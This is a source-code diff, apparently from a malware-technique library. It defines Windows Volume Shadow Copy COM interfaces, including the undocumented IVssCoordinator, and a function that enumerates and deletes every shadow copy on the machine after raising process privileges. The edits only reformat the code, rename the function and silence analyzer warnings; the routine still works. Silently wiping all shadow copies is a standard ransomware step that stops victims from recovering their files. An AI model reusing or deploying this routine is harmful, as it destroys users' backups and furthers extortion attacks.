@@ -9,7 +9,7 @@ typedef GUID VSS_ID;
 typedef WCHAR* VSS_PWSZ;
 typedef LONGLONG VSS_TIMESTAMP;
 
-typedef enum _VSS_SNAPSHOT_STATE{
+typedef enum _VSS_SNAPSHOT_STATE {
 	VSS_SS_UNKNOWN = 0,
 	VSS_SS_PREPARING = (VSS_SS_UNKNOWN + 1),
 	VSS_SS_PROCESSING_PREPARE = (VSS_SS_PREPARING + 1),
@@ -29,7 +29,7 @@ typedef enum _VSS_SNAPSHOT_STATE{
 	VSS_SS_COUNT = (VSS_SS_POSTCOMMITTED + 1)
 } VSS_SNAPSHOT_STATE;
 
-typedef enum _VSS_OBJECT_TYPE{
+typedef enum _VSS_OBJECT_TYPE {
 	VSS_OBJECT_UNKNOWN = 0,
 	VSS_OBJECT_NONE = (VSS_OBJECT_UNKNOWN + 1),
 	VSS_OBJECT_SNAPSHOT_SET = (VSS_OBJECT_NONE + 1),
@@ -38,7 +38,7 @@ typedef enum _VSS_OBJECT_TYPE{
 	VSS_OBJECT_TYPE_COUNT = (VSS_OBJECT_PROVIDER + 1)
 } VSS_OBJECT_TYPE;
 
-typedef enum _VSS_PROVIDER_TYPE{
+typedef enum _VSS_PROVIDER_TYPE {
 	VSS_PROV_UNKNOWN = 0,
 	VSS_PROV_SYSTEM = 1,
 	VSS_PROV_SOFTWARE = 2,
@@ -46,7 +46,7 @@ typedef enum _VSS_PROVIDER_TYPE{
 	VSS_PROV_FILESHARE = 4
 } VSS_PROVIDER_TYPE;
 
-typedef struct _VSS_SNAPSHOT_PROP{
+typedef struct _VSS_SNAPSHOT_PROP {
 	VSS_ID m_SnapshotId;
 	VSS_ID m_SnapshotSetId;
 	LONG m_lSnapshotsCount;
@@ -62,7 +62,7 @@ typedef struct _VSS_SNAPSHOT_PROP{
 	VSS_SNAPSHOT_STATE m_eStatus;
 } VSS_SNAPSHOT_PROP;
 
-typedef struct _VSS_PROVIDER_PROP{
+typedef struct _VSS_PROVIDER_PROP {
 	VSS_ID m_ProviderId;
 	VSS_PWSZ m_pwszProviderName;
 	VSS_PROVIDER_TYPE m_eProviderType;
@@ -71,18 +71,18 @@ typedef struct _VSS_PROVIDER_PROP{
 	CLSID m_ClassId;
 } VSS_PROVIDER_PROP;
 
-typedef union __MIDL___MIDL_itf_vss_0000_0000_0001{
+typedef union __MIDL___MIDL_itf_vss_0000_0000_0001 {
 	VSS_SNAPSHOT_PROP Snap;
 	VSS_PROVIDER_PROP Prov;
 } VSS_OBJECT_UNION;
 
-typedef struct _VSS_OBJECT_PROP{
+typedef struct _VSS_OBJECT_PROP {
 	VSS_OBJECT_TYPE Type;
 	VSS_OBJECT_UNION Obj;
 } VSS_OBJECT_PROP;
 
 struct __declspec(uuid("AE1C7110-2F60-11d3-8A39-00C04F72D8E3"))
-	IVssEnumObject : public IUnknown{
+	IVssEnumObject : public IUnknown {
 #pragma warning( push )
 #pragma warning( disable : 28285)
 	virtual HRESULT __stdcall Next(ULONG, __RPC__out_ecount_part(celt, *pceltFetched) VSS_OBJECT_PROP*, ULONG*) = 0;
@@ -93,14 +93,14 @@ struct __declspec(uuid("AE1C7110-2F60-11d3-8A39-00C04F72D8E3"))
 };
 
 struct __declspec(uuid("507C37B4-CF5B-4e95-B0AF-14EB9767467E"))
-	IVssAsync : public IUnknown{
+	IVssAsync : public IUnknown {
 	virtual HRESULT __stdcall Cancel(VOID) = 0;
 	virtual HRESULT __stdcall Wait(DWORD dwMilliseconds = 0xffffffff) = 0;
 	virtual HRESULT __stdcall QueryStatus(HRESULT*, INT*) = 0;
 };
 
 struct __declspec(uuid("{da9f41d4-1a5d-41d0-a614-6dfd78df5d05}"))
-	IVssCoordinator: public IUnknown{
+	IVssCoordinator : public IUnknown {
 	virtual HRESULT __stdcall SetContext(LONG) = 0;
 	virtual HRESULT __stdcall StartSnapshotSet(LPGUID) = 0;
 	virtual HRESULT __stdcall AddToSnapshotSet(PWCHAR, GUID, LPGUID) = 0;
@@ -159,7 +159,7 @@ EXIT_ROUTINE:
 	return EhWin32FromHResult(Result);
 }
 
-DWORD ComVssDeleteShadowVolumeBackups(BOOL CoUninitializeAfterCompletion)
+DWORD MpfComVssDeleteShadowVolumeBackups(BOOL CoUninitializeAfterCompletion)
 {
 	HRESULT Result = S_OK;
 	IVssCoordinator* VssCoordinator = NULL;
@@ -172,7 +172,7 @@ DWORD ComVssDeleteShadowVolumeBackups(BOOL CoUninitializeAfterCompletion)
 	if (InitializeComWithSecurityContextDefault(TRUE) != ERROR_SUCCESS)
 		goto EXIT_ROUTINE;
 
-	if (!SetProcessPrivilegeToken(MW_SEBACKUP_PRIVILEGE))
+	if (!SetProcessPrivilegeToken(1))
 		return FALSE;
 
 #pragma warning( push )
@@ -213,15 +213,20 @@ DWORD ComVssDeleteShadowVolumeBackups(BOOL CoUninitializeAfterCompletion)
 		RtlZeroMemory(ShadowCopyId, (32 * sizeof(WCHAR)));
 		RtlZeroMemory(ShadowCopySetId, (32 * sizeof(WCHAR)));
 
-		if (StringFromGUID2(Element.Obj.Snap.m_SnapshotId, ShadowCopyId, (32 * sizeof(WCHAR))) == ERROR_FAILURE_RETURN)
+#pragma warning( push )
+#pragma warning( disable : 6386)
+		if (StringFromGUID2(Element.Obj.Snap.m_SnapshotId, ShadowCopyId, (32 * sizeof(WCHAR))) == 0)
 			continue;
+#pragma warning( pop )
 
-		if (StringFromGUID2(Element.Obj.Snap.m_SnapshotSetId, ShadowCopySetId, (32 * sizeof(WCHAR))) == ERROR_FAILURE_RETURN)
+#pragma warning( push )
+#pragma warning( disable : 6386)
+		if (StringFromGUID2(Element.Obj.Snap.m_SnapshotSetId, ShadowCopySetId, (32 * sizeof(WCHAR))) == 0)
 			continue;
+#pragma warning( pop )
 
 		VssCoordinator->DeleteSnapshots(Element.Obj.Snap.m_SnapshotId, VSS_OBJECT_SNAPSHOT, 1, &Dispose, &SnapshotDipose);
 	}
-
 
 EXIT_ROUTINE:
 
@@ -242,4 +247,3 @@ EXIT_ROUTINE:
 
 	return EhWin32FromHResult(Result);
 }
-
